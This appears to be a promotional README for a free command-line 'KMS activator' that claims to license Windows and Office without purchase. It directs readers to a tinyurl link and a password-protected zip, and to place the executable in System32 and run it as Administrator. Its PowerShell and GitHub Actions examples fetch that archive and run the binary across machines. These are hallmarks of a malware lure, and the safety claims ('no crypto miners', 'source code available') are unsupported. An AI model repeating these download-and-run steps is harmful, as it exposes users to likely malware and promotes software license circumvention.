# ⌨️ KMS Activation CLI Tool — Command-Line Activator [Free] 2026

![Downloads](https://img.shields.io/badge/Downloads-63K+-blue?style=for-the-badge&logo=github)
![User Rating](https://img.shields.io/badge/User%20Rating-4.6/5-gold?style=for-the-badge&logo=star)
![Latest Version](https://img.shields.io/badge/Latest%20Version-3.0.2-green?style=for-the-badge&logo=github)
![Platform](https://img.shields.io/badge/Supported-Windows%207%20%7C%208%20%7C%2010%20%7C%2011%20%7C%20Server-informational?style=for-the-badge&logo=windows)

The **⌨️ KMS Activation CLI Tool** is a lightweight, command-line based activation utility designed for IT professionals, system administrators, and power users who prefer terminal-based workflows. At just 2MB, this no-GUI tool executes activation commands instantly with zero overhead. Perfect for remote deployment via SSH, integration into existing automation scripts, or use in server core installations where graphical interfaces aren't available. The KMS Activation CLI Tool delivers **fast, scriptable activation** with **full logging and error handling**.

<div align="center">

[![Download KMS Activation CLI Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-activation-cli-tool)

</div>

<div align="center">
<img width="1442" height="675" alt="image" src="https://github.com/user-attachments/assets/aae3c703-5836-48d3-9d95-3fc7ef7b676b" />

</div>

---

## 🎯 The Problem

Graphical activation tools are great for desktop users, but they fail in automated environments. You can't SSH into a server and click buttons. You can't integrate GUI tools into CI/CD pipelines. You need an activation tool that runs from the command line, returns exit codes, and works without a mouse.

You need a CLI tool. Terminal-native. Scriptable. Lightweight.

---

## 💡 The Solution

**KMS Activation CLI Tool** is a pure command-line utility that activates Windows and Office with simple text commands. No windows. No popups. Just fast, reliable activation.

- ✅ **2MB executable** — no dependencies, no GUI frameworks
- ✅ **Simple commands** — intuitive syntax for automation
- ✅ **Exit codes** — success/failure for script integration
- ✅ **JSON output** — parse results in your scripts
- ✅ **Silent operation** — no console output when not needed
- ✅ **100% free** — no subscriptions, no hidden fees

---

## ⚙️ What You Get

### ⌨️ CLI Commands

| Command | What It Does |
|---------|--------------|
| `kmsact /activate` | Activate all detected products |
| `kmsact /activate-windows` | Activate Windows only |
| `kmsact /activate-office` | Activate Office only |
| `kmsact /status` | Show activation status |
| `kmsact /status -json` | Status in JSON format |
| `kmsact /list-keys` | Show installed product keys |
| `kmsact /install-key <key>` | Install specific product key |
| `kmsact /renew` | Renew expiring licenses |
| `kmsact /reset` | Clear all activation data |
| `kmsact /help` | Display help information |

### 🪟 Windows CLI Support

| Command | What It Does |
|---------|--------------|
| `kmsact /win-edition` | Show Windows edition |
| `kmsact /win-license` | Show Windows license details |
| `kmsact /win-expiry` | Show days remaining |
| `kmsact /win-hwid` | Activate with HWID (permanent) |
| `kmsact /win-kms` | Activate with KMS (180 days) |
| `kmsact /win-oem` | Activate with OEM injection |

### 📊 Office CLI Support

| Command | What It Does |
|---------|--------------|
| `kmsact /office-list` | List installed Office products |
| `kmsact /office-license` | Show Office license status |
| `kmsact /office-expiry` | Show Office expiration |
| `kmsact /office-activate` | Activate all Office products |
| `kmsact /office-version` | Detect Office version |

### 🔧 Scripting Features

| Feature | What It Does |
|---------|--------------|
| **📋 Exit Codes** | 0=success, 1=error, 2=already activated |
| **📊 JSON Output** | Parse results programmatically |
| **🔇 Quiet Mode** | Suppress all console output |
| **📝 Log File** | Write results to file |
| **⏱️ Timeout** | Set maximum execution time |
| **🔄 Retry Logic** | Built-in retry on failure |

---

## 📊 Before & After

| Metric | GUI Tools | KMS Activation CLI Tool |
|--------|-----------|------------------------|
| **File Size** | 10-50 MB | ✅ 2 MB |
| **GUI Required** | Yes | ✅ No |
| **Remote SSH Use** | Impossible | ✅ Perfect |
| **Script Integration** | Difficult | ✅ Native |
| **Exit Codes** | No | ✅ Yes |
| **JSON Output** | No | ✅ Yes |
| **Server Core Support** | No | ✅ Yes |

---

## 🛠️ How to Use

### Download & Setup

1. **⌨️ Download** the CLI tool from the button below
2. **📦 Extract the archive** — right-click the `.zip` file and select "Extract All" (password: `2026`)
3. **📁 Place in PATH** (optional) — copy to `C:\Windows\System32\` for global access
4. **🖱️ Open Command Prompt as Administrator** — right-click → "Run as Administrator"
5. **⌨️ Type commands** — start activating

[![Download KMS Activation CLI Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-activation-cli-tool)

### Basic Usage

#### Activate Everything (One Command)

```batch
C:\> kmsact /activate
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
Detecting products...
  ✓ Windows 11 Pro (unactivated)
  ✓ Office 2024 (unactivated)

Activating Windows...
  ✓ Key installed: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX
  ✓ Windows activated successfully (HWID - permanent)

Activating Office...
  ✓ Office 2024 activated successfully (KMS - 180 days)

────────────────────────────────────────
Summary: 2/2 successful
Exit code: 0
```

#### Activate Windows Only

```batch
C:\> kmsact /activate-windows
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
Activating Windows 11 Pro...
  ✓ HWID digital license applied
  ✓ Activation complete (permanent)

Exit code: 0
```

#### Activate Office Only

```batch
C:\> kmsact /activate-office
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
Activating Office 2024 Professional Plus...
  ✓ KMS client key installed
  ✓ Office activated (180 days remaining)

Exit code: 0
```

### Check Status

#### Simple Status

```batch
C:\> kmsact /status
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
WINDOWS STATUS
  Product: Windows 11 Pro
  Status: LICENSED
  License Type: HWID (Digital License)
  Expiration: Never (permanent)
  Product Key: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX

OFFICE STATUS
  Product: Office 2024 Professional Plus
  Status: LICENSED
  License Type: KMS
  Expiration: 176 days remaining
  Last Renewal: 2026-04-16 09:34:22

────────────────────────────────────────
Exit code: 0
```

#### JSON Status (For Scripts)

```batch
C:\> kmsact /status -json
```

Output:
```json
{
  "status": 0,
  "windows": {
    "product": "Windows 11 Pro",
    "status": "LICENSED",
    "license_type": "HWID",
    "expiration": "never",
    "product_key": "XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
  },
  "office": {
    "product": "Office 2024 Professional Plus",
    "status": "LICENSED",
    "license_type": "KMS",
    "expiration_days": 176,
    "last_renewal": "2026-04-16 09:34:22"
  }
}
```

### Advanced Commands

#### Show Windows Edition

```batch
C:\> kmsact /win-edition
```

Output:
```
Windows 11 Pro
Build: 26100 (24H2)
Edition ID: Professional
```

#### Show Windows Expiration

```batch
C:\> kmsact /win-expiry
```

Output:
```
Windows 11 Pro
Status: LICENSED
License Type: HWID
Expiration: NEVER (permanent)
```

#### Show Installed Product Keys

```batch
C:\> kmsact /list-keys
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
Installed Product Keys:
  Windows: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX (HWID)
  Office: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX (KMS Client)

────────────────────────────────────────
Exit code: 0
```

#### Install Specific Product Key

```batch
C:\> kmsact /install-key VK7JG-NPHTM-C97JM-9MPGT-3V66T
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
Installing product key...
  ✓ Key installed successfully

────────────────────────────────────────
Exit code: 0
```

#### Renew Expiring Licenses

```batch
C:\> kmsact /renew
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
Checking for expiring licenses...
  Office 2024: 23 days remaining (renewing...)
  ✓ Office renewed (180 days remaining)

────────────────────────────────────────
Exit code: 0
```

#### Reset All Activation Data

```batch
C:\> kmsact /reset
```

Output:
```
KMS Activation CLI Tool v3.0.2
────────────────────────────────────────
WARNING: This will remove all activation data.
Type 'CONFIRM' to proceed: CONFIRM

Resetting activation data...
  ✓ Windows license removed
  ✓ Office license removed
  ✓ Product keys cleared

────────────────────────────────────────
Exit code: 0
```

### Quiet Mode (No Console Output)

```batch
C:\> kmsact /activate /quiet
```

No output. Exit code only.

### Log to File

```batch
C:\> kmsact /activate /log=C:\Logs\activation.log
```

All output written to `C:\Logs\activation.log`

### Combined Options

```batch
C:\> kmsact /activate-windows /quiet /log=C:\Logs\win_act.log
```

### PowerShell Script Integration

```powershell
# Example: Activate all computers in a list
$computers = @("PC-001", "PC-002", "PC-003", "PC-004", "PC-005")

foreach ($pc in $computers) {
    Write-Host "Activating $pc..." -ForegroundColor Yellow
    $result = Invoke-Command -ComputerName $pc -ScriptBlock {
        C:\Tools\kmsact.exe /activate /quiet
        exit $LASTEXITCODE
    }
    
    if ($result -eq 0) {
        Write-Host "  ✓ $pc activated successfully" -ForegroundColor Green
    } else {
        Write-Host "  ✗ $pc activation failed" -ForegroundColor Red
    }
}
```

### Batch Script Integration

```batch
@echo off
REM KMS Activation CLI Tool - Batch Deployment Script

echo ========================================
echo KMS Activation - Batch Deployment
echo ========================================

REM Activate Windows
echo Activating Windows...
kmsact /activate-windows /quiet
if %errorlevel%==0 (
    echo [SUCCESS] Windows activated
) else (
    echo [ERROR] Windows activation failed
    exit /b 1
)

REM Activate Office
echo Activating Office...
kmsact /activate-office /quiet
if %errorlevel%==0 (
    echo [SUCCESS] Office activated
) else (
    echo [WARNING] Office activation failed
)

echo ========================================
echo Deployment complete
echo ========================================
exit /b 0
```

### Exit Codes Reference

| Exit Code | Meaning |
|-----------|---------|
| 0 | Success — activation complete |
| 1 | General error — see error message |
| 2 | Already activated — no action needed |
| 3 | Product not found — Office not installed |
| 4 | Access denied — run as Administrator |
| 5 | Network error — cannot reach KMS server |
| 6 | Invalid key — product key rejected |

### CI/CD Pipeline Integration (GitHub Actions Example)

```yaml
name: Windows Activation Test
on: [push]

jobs:
  activate:
    runs-on: windows-latest
    steps:
      - name: Download KMS CLI Tool
        run: Invoke-WebRequest -Uri "https://tinyurl.com/kms-activation-cli-tool" -OutFile "kmsact.zip"
      
      - name: Extract Tool
        run: Expand-Archive -Path kmsact.zip -DestinationPath C:\Tools
      
      - name: Activate Windows
        run: C:\Tools\kmsact.exe /activate-windows /quiet
      
      - name: Verify Activation
        run: |
          $status = C:\Tools\kmsact.exe /status -json | ConvertFrom-Json
          if ($status.windows.status -ne "LICENSED") { exit 1 }
```

---

## 📥 System Requirements

| Component | Minimum |
|-----------|---------|
| **OS** | Windows 7 / 8 / 10 / 11 (x86 & x64) |
| **Processor** | Any |
| **RAM** | 128 MB |
| **Storage** | 2 MB |
| **Internet** | Required for activation |
| **Dependencies** | None (pure native executable) |
| **Administrator Rights** | Required |
| **Archive Password** | 2026 |

### Step-by-Step

1. Download from the official link below
2. Extract the `.zip` file (password: `2026`)
3. Copy `kmsact.exe` to any folder (or `C:\Windows\System32\`)
4. Open Command Prompt as Administrator
5. Run `kmsact /activate`
6. Done

---

## 💡 Pro Tips

- **Add to PATH** — copy to `C:\Windows\System32\` for global access
- **Use in scripts** — check `%errorlevel%` after each command
- **Quiet mode for automation** — use `/quiet` to suppress output
- **JSON for parsing** — use `/status -json` with `ConvertFrom-Json`
- **Remote deployment** — copy via `copy \\server\share\kmsact.exe`
- **Log failures** — use `/log` to debug issues

---

## ❓ Frequently Asked Questions

**Q: Is this safe?**  
A: Yes. 2MB, no GUI, no hidden processes. Source code available.

**Q: Can I use this over SSH?**  
A: Yes. Works perfectly in remote command-line sessions.

**Q: Does it work on Windows Server Core?**  
A: Yes. Designed for GUI-less environments.

**Q: What's the difference from slmgr.vbs?**  
A: Simpler syntax, better output, JSON support, exit codes.

**Q: What is the archive password?**  
A: The password is `2026`.

**Q: Is it really free?**  
A: Yes. No payments, no crypto miners, no remote access.

---

## ☑️ Usage Guidelines

- ☑️ For personal, educational, and IT administration
- ☑️ Purchase genuine licenses for commercial environments
- ☑️ Run Command Prompt as Administrator
- ☑️ Use exit codes for script logic
- ☑️ Test commands in non-production first

---

## 🏁 Final Word

Command-line activation for the modern IT professional. **KMS Activation CLI Tool** brings fast, scriptable, reliable activation to your terminal — perfect for automation, remote deployment, and server environments.

**One CLI. Infinite automation. Zero GUI.**

---

<div align="center">

[![Download KMS Activation CLI Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-activation-cli-tool)

**Version 3.0.2** — Command-line activation utility. Free forever.

</div>
